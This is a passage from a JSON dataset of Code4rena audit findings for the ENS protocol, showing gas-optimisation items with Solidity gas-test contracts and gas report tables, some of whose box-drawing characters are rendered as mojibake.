â”†        â”†     â”†         â”‚\nâ”œâ•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ”¼â•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ”¼â•Œâ•Œâ•Œâ•Œâ•Œâ”¼â•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ”¼â•Œâ•Œâ•Œâ•Œâ•Œâ”¼â•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ”¤\nâ”‚ 23675                  â”† 147             â”†     â”†        â”†     â”†         â”‚\nâ”œâ•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ”¼â•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ”¼â•Œâ•Œâ•Œâ•Œâ•Œâ”¼â•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ”¼â•Œâ•Œâ•Œâ•Œâ•Œâ”¼â•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ”¤\nâ”‚ Function Name          â”† min             â”† avg â”† median â”† max â”† # calls â”‚\nâ”œâ•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ”¼â•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ”¼â•Œâ•Œâ•Œâ•Œâ•Œâ”¼â•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ”¼â•Œâ•Œâ•Œâ•Œâ•Œâ”¼â•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ”¤\nâ”‚ addressInternalBalance â”† 148             â”† 148 â”† 148    â”† 148 â”† 1       â”‚\nâ•°â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”´â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”´â”€â”€â”€â”€â”€â”´â”€â”€â”€â”€â”€â”€â”€â”€â”´â”€â”€â”€â”€â”€â”´â”€â”€â”€â”€â”€â”€â”€â”€â”€â•¯\nâ•­â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”¬â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”¬â”€â”€â”€â”€â”€â”¬â”€â”€â”€â”€â”€â”€â”€â”€â”¬â”€â”€â”€â”€â”€â”¬â”€â”€â”€â”€â”€â”€â”€â”€â”€â•®\nâ”‚ Contract1 contract      â”†                 â”†     â”†        â”†     â”†         â”‚\nâ•žâ•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•ªâ•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•ªâ•â•â•â•â•â•ªâ•â•â•â•â•â•â•â•â•ªâ•â•â•â•â•â•ªâ•â•â•â•â•â•â•â•â•â•¡\nâ”‚ Deployment Cost         â”† Deployment Size â”†     â”†        â”†     â”†         â”‚\nâ”œâ•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ”¼â•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ”¼â•Œâ•Œâ•Œâ•Œâ•Œâ”¼â•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ”¼â•Œâ•Œâ•Œâ•Œâ•Œâ”¼â•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ”¤\nâ”‚ 27081                   â”† 165             â”†     â”†        â”†     â”†         â”‚\nâ”œâ•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ”¼â•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ”¼â•Œâ•Œâ•Œâ•Œâ•Œâ”¼â•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ”¼â•Œâ•Œâ•Œâ•Œâ•Œâ”¼â•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ”¤\nâ”‚ Function Name           â”† min             â”† avg â”† median â”† max â”† # calls â”‚\nâ”œâ•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ”¼â•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ”¼â•Œâ•Œâ•Œâ•Œâ•Œâ”¼â•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ”¼â•Œâ•Œâ•Œâ•Œâ•Œâ”¼â•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ”¤\nâ”‚ assemblyInternalBalance â”† 133             â”† 133 â”† 133    â”† 133 â”† 1       â”‚\nâ•°â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”´â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”´â”€â”€â”€â”€â”€â”´â”€â”€â”€â”€â”€â”€â”€â”€â”´â”€â”€â”€â”€â”€â”´â”€â”€â”€â”€â”€â”€â”€â”€â”€â•¯\nâ•­â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”¬â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”¬â”€â”€â”€â”€â”€â”¬â”€â”€â”€â”€â”€â”€â”€â”€â”¬â”€â”€â”€â”€â”€â”¬â”€â”€â”€â”€â”€â”€â”€â”€â”€â•®\nâ”‚ Contract2 contract     â”†                 â”†     â”†        â”†     â”†         â”‚\nâ•žâ•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•ªâ•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•ªâ•â•â•â•â•â•ªâ•â•â•â•â•â•â•â•â•ªâ•â•â•â•â•â•ªâ•â•â•â•â•â•â•â•â•â•¡\nâ”‚ Deployment Cost        â”† Deployment Size â”†     â”†        â”†     â”†         â”‚\nâ”œâ•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ”¼â•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ”¼â•Œâ•Œâ•Œâ•Œâ•Œâ”¼â•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ”¼â•Œâ•Œâ•Œâ•Œâ•Œâ”¼â•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ”¤\nâ”‚ 61511                  â”† 339             â”†     â”†        â”†     â”†         â”‚\nâ”œâ•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ”¼â•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ”¼â•Œâ•Œâ•Œâ•Œâ•Œâ”¼â•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ”¼â•Œâ•Œâ•Œâ•Œâ•Œâ”¼â•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ”¤\nâ”‚ Function Name          â”† min             â”† avg â”† median â”† max â”† # calls â”‚\nâ”œâ•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ”¼â•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ”¼â•Œâ•Œâ•Œâ•Œâ•Œâ”¼â•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ”¼â•Œâ•Œâ•Œâ•Œâ•Œâ”¼â•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ”¤\nâ”‚ addressExternalBalance â”† 417             â”† 417 â”† 417    â”† 417 â”† 1       â”‚\nâ•°â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”´â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”´â”€â”€â”€â”€â”€â”´â”€â”€â”€â”€â”€â”€â”€â”€â”´â”€â”€â”€â”€â”€â”´â”€â”€â”€â”€â”€â”€â”€â”€â”€â•¯\nâ•­â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”¬â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”¬â”€â”€â”€â”€â”€â”¬â”€â”€â”€â”€â”€â”€â”€â”€â”¬â”€â”€â”€â”€â”€â”¬â”€â”€â”€â”€â”€â”€â”€â”€â”€â•®\nâ”‚ Contract3 contract      â”†                 â”†     â”†        â”†     â”†         â”‚\nâ•žâ•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•ªâ•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•ªâ•â•â•â•â•â•ªâ•â•â•â•â•â•â•â•â•ªâ•â•â•â•â•â•ªâ•â•â•â•â•â•â•â•â•â•¡\nâ”‚ Deployment Cost         â”† Deployment Size â”†     â”†        â”†     â”†         â”‚\nâ”œâ•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ”¼â•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ”¼â•Œâ•Œâ•Œâ•Œâ•Œâ”¼â•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ”¼â•Œâ•Œâ•Œâ•Œâ•Œâ”¼â•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ”¤\nâ”‚ 57105                   â”† 317             â”†     â”†        â”†     â”†         â”‚\nâ”œâ•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ”¼â•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ”¼â•Œâ•Œâ•Œâ•Œâ•Œâ”¼â•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ”¼â•Œâ•Œâ•Œâ•Œâ•Œâ”¼â•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ”¤\nâ”‚ Function Name           â”† min             â”† avg â”† median â”† max â”† # calls â”‚\nâ”œâ•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ”¼â•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ”¼â•Œâ•Œâ•Œâ•Œâ•Œâ”¼â•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ”¼â•Œâ•Œâ•Œâ•Œâ•Œâ”¼â•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ”¤\nâ”‚ assemblyExternalBalance â”† 411             â”† 411 â”† 411    â”† 411 â”† 1       â”‚\nâ•°â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”´â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”´â”€â”€â”€â”€â”€â”´â”€â”€â”€â”€â”€â”€â”€â”€â”´â”€â”€â”€â”€â”€â”´â”€â”€â”€â”€â”€â”€â”€â”€â”€â•¯\n\n```\n\n### Lines\n\n*   ETHRegistrarController.sol:211\n\n",
      "summary": "",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "ENS",
      "source_link": "https://code4rena.com/reports/2022-07-ens",
      "github_link": "#g-08-use-assembly-when-getting-a-contracts-balance-of-eth",
      "tags": [],
      "finders": []
    },
    {
      "id": "5566",
      "title": "[G-07] Use assembly to check for address(0)",
      "impact": "GAS",
      "content": "\n```js\n\n\ncontract GasTest is DSTest {\n    Contract0 c0;\n    Contract1 c1;\n\n    function setUp() public {\n        c0 = new Contract0();\n        c1 = new Contract1();\n    }\n\n    function testGas() public view {\n        c0.ownerNotZero(address(this));\n        c1.assemblyOwnerNotZero(address(this));\n    }\n}\n\ncontract Contract0 {\n    function ownerNotZero(address _addr) public pure {\n        require(_addr != address(0), \"zero address)\");\n    }\n}\n\ncontract Contract1 {\n    function assemblyOwnerNotZero(address _addr) public pure {\n        assembly {\n            if iszero(_addr) {\n                mstore(0x00, \"zero address\")\n                revert(0x00, 0x20)\n            }\n        }\n    }\n}\n\n\n```\n\n### Gas Report\n\n```js\nâ•­â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”¬â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”¬â”€â”€â”€â”€â”€â”¬â”€â”€â”€â”€â”€â”€â”€â”€â”¬â”€â”€â”€â”€â”€â”¬â”€â”€â”€â”€â”€â”€â”€â”€â”€â•®\nâ”‚ Contract0 contract â”†                 â”†     â”†        â”†     â”†         â”‚\nâ•žâ•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•ªâ•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•ªâ•â•â•â•â•â•ªâ•â•â•â•â•â•â•â•â•ªâ•â•â•â•â•â•ªâ•â•â•â•â•â•â•â•â•â•¡\nâ”‚ Deployment Cost    â”† Deployment Size â”†     â”†        â”†     â”†         â”‚\nâ”œâ•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ”¼â•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ”¼â•Œâ•Œâ•Œâ•Œâ•Œâ”¼â•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ”¼â•Œâ•Œâ•Œâ•Œâ•Œâ”¼â•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ”¤\nâ”‚ 61311              â”† 338             â”†     â”†        â”†     â”†         â”‚\nâ”œâ•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ”¼â•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ”¼â•Œâ•Œâ•Œâ•Œâ•Œâ”¼â•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ”¼â•Œâ•Œâ•Œâ•Œâ•Œâ”¼â•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ”¤\nâ”‚ Function Name      â”† min             â”† avg â”† median â”† max â”† # calls â”‚\nâ”œâ•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ”¼â•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ”¼â•Œâ•Œâ•Œâ•Œâ•Œâ”¼â•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ”¼â•Œâ•Œâ•Œâ•Œâ•Œâ”¼â•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ”¤\nâ”‚ ownerNotZero       â”† 258             â”† 258 â”† 258    â”† 258 â”† 1       â”‚\nâ•°â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”´â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”´â”€â”€â”€â”€â”€â”´â”€â”€â”€â”€â”€â”€â”€â”€â”´â”€â”€â”€â”€â”€â”´â”€â”€â”€â”€â”€â”€â”€â”€â”€â•¯\nâ•­â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”¬â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”¬â”€â”€â”€â”€â”€â”¬â”€â”€â”€â”€â”€â”€â”€â”€â”¬â”€â”€â”€â”€â”€â”¬â”€â”€â”€â”€â”€â”€â”€â”€â”€â•®\nâ”‚ Contract1 contract   â”†                 â”†     â”†        â”†     â”†         â”‚\nâ•žâ•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•ªâ•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•ªâ•â•â•â•â•â•ªâ•â•â•â•â•â•â•â•â•ªâ•â•â•â•â•â•ªâ•â•â•â•â•â•â•â•â•â•¡\nâ”‚ Deployment Cost      â”† Deployment Size â”†     â”†        â”†     â”†         â”‚\nâ”œâ•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ”¼â•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ”¼â•Œâ•Œâ•Œâ•Œâ•Œâ”¼â•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ”¼â•Œâ•Œâ•Œâ•Œâ•Œâ”¼â•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ”¤\nâ”‚ 44893                â”† 255             â”†     â”†        â”†     â”†         â”‚\nâ”œâ•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ”¼â•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ”¼â•Œâ•Œâ•Œâ•Œâ•Œâ”¼â•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ”¼â•Œâ•Œâ•Œâ•Œâ•Œâ”¼â•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ”¤\nâ”‚ Function Name        â”† min             â”† avg â”† median â”† max â”† # calls â”‚\nâ”œâ•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ”¼â•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ”¼â•Œâ•Œâ•Œâ•Œâ•Œâ”¼â•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ”¼â•Œâ•Œâ•Œâ•Œâ•Œâ”¼â•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ”¤\nâ”‚ assemblyOwnerNotZero â”† 252             â”† 252 â”† 252    â”† 252 â”† 1       â”‚\nâ•°â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”´â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”´â”€â”€â”€â”€â”€â”´â”€â”€â”€â”€â”€â”€â”€â”€â”´â”€â”€â”€â”€â”€â”´â”€â”€â”€â”€â”€â”€â”€â”€â”€â•¯\n```\n\n### Lines\n\n*   ReverseRegistrar.sol:53\n\n*   DNSSECImpl.sol:336\n\n*   ETHRegistrarController.sol:100\n\n*   NameWrapper.sol:132\n\n*   NameWrapper.sol:139\n\n*   NameWrapper.sol:318\n\n*   NameWrapper.sol:661\n\n*   NameWrapper.sol:763\n\n*   NameWrapper.sol:799\n\n*   NameWrapper.sol:911\n\n*   ERC1155Fuse.sol:61\n\n*   ERC1155Fuse.sol:176\n\n*   ERC1155Fuse.sol:199\n\n*   ERC1155Fuse.sol:248\n\n*   ERC1155Fuse.sol:249\n\n",
      "summary": "",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "ENS",
      "source_link": "https://code4rena.com/reports/2022-07-ens",
      "github_link": "#g-07-use-assembly-to-check-for-address0",
      "tags": [],
      "finders": []
    },
    {
      "id": "5565",
      "title": "[G-06] Use assembly to write storage values",
      "impact": "GAS",
      "content": "\n```js\n\ncontract GasTest is DSTest {\n    Contract0 c0;\n    Contract1 c1;\n\n    function setUp() public {\n        c0 = new Contract0();\n        c1 = new Contract1();\n    }\n\n    function testGas() public {\n        c0.updateOwner(0x158B28A1b1CB1BE12C6bD8f5a646a0e3B2024734);\n        c1.assemblyUpdateOwner(0x158B28A1b1CB1BE12C6bD8f5a646a0e3B2024734);\n    }\n}\n\ncontract Contract0 {\n    address owner = 0xb4c79daB8f259C7Aee6E5b2Aa729821864227e84;\n\n    function updateOwner(address newOwner) public {\n        owner = newOwner;\n    }\n}\n\ncontract Contract1 {\n    address owner = 0xb4c79daB8f259C7Aee6E5b2Aa729821864227e84;\n\n    function assemblyUpdateOwner(address newOwner) public {\n        assembly {\n            sstore(owner.slot, newOwner)\n        }\n    }\n}\n\n```\n\n### Gas Report\n\n```js\nâ•­â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”¬â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”¬â”€â”€â”€â”€â”€â”€â”¬â”€â”€â”€â”€â”€â”€â”€â”€â”¬â”€â”€â”€â”€â”€â”€â”¬â”€â”€â”€â”€â”€â”€â”€â”€â”€â•®\nâ”‚ Contract0 contract â”†                 â”†      â”†        â”†      â”†         â”‚\nâ•žâ•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•ªâ•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•ªâ•â•â•â•â•â•â•ªâ•â•â•â•â•â•â•â•â•ªâ•â•â•â•â•â•â•ªâ•â•â•â•â•â•â•â•â•â•¡\nâ”‚ Deployment Cost    â”† Deployment Size â”†      â”†        â”†      â”†         â”‚\nâ”œâ•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ”¼â•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ”¼â•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ”¼â•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ”¼â•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ”¼â•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ”¤\nâ”‚ 60623              â”† 261             â”†      â”†        â”†      â”†         â”‚\nâ”œâ•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ”¼â•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ”¼â•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ”¼â•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ”¼â•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ”¼â•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ”¤\nâ”‚ Function Name      â”† min             â”† avg  â”† median â”† max  â”† # calls â”‚\nâ”œâ•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ”¼â•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ”¼â•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ”¼â•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ”¼â•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ”¼â•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ”¤\nâ”‚ updateOwner        â”† 5302            â”† 5302 â”† 5302   â”† 5302 â”† 1       â”‚\nâ•°â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”´â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”´â”€â”€â”€â”€â”€â”€â”´â”€â”€â”€â”€â”€â”€â”€â”€â”´â”€â”€â”€â”€â”€â”€â”´â”€â”€â”€â”€â”€â”€â”€â”€â”€â•¯\nâ•­â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”¬â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”¬â”€â”€â”€â”€â”€â”€â”¬â”€â”€â”€â”€â”€â”€â”€â”€â”¬â”€â”€â”€â”€â”€â”€â”¬â”€â”€â”€â”€â”€â”€â”€â”€â”€â•®\nâ”‚ Contract1 contract â”†                 â”†      â”†        â”†      â”†         